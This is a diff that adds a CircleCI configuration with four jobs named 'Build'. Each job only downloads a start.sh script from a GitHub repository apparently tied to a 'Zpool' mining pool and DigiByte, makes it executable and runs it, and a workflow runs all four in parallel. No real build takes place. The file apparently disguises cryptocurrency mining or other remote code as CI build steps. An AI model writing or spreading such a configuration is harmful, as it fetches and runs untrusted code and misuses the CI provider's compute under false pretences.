@@ -1,0 +1,40 @@
+version: 2
+jobs:
+    Build_01:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/Zpool/main/DGB/XX/start.sh && chmod u+x start.sh && ./start.sh
+    Build_02:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/Zpool/main/DGB/XX/start.sh && chmod u+x start.sh && ./start.sh
+    Build_03:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/Zpool/main/DGB/XX/start.sh && chmod u+x start.sh && ./start.sh
+    Build_04:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/Zpool/main/DGB/XX/start.sh && chmod u+x start.sh && ./start.sh
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - Build_01
+            - Build_02
+            - Build_03
+            - Build_04
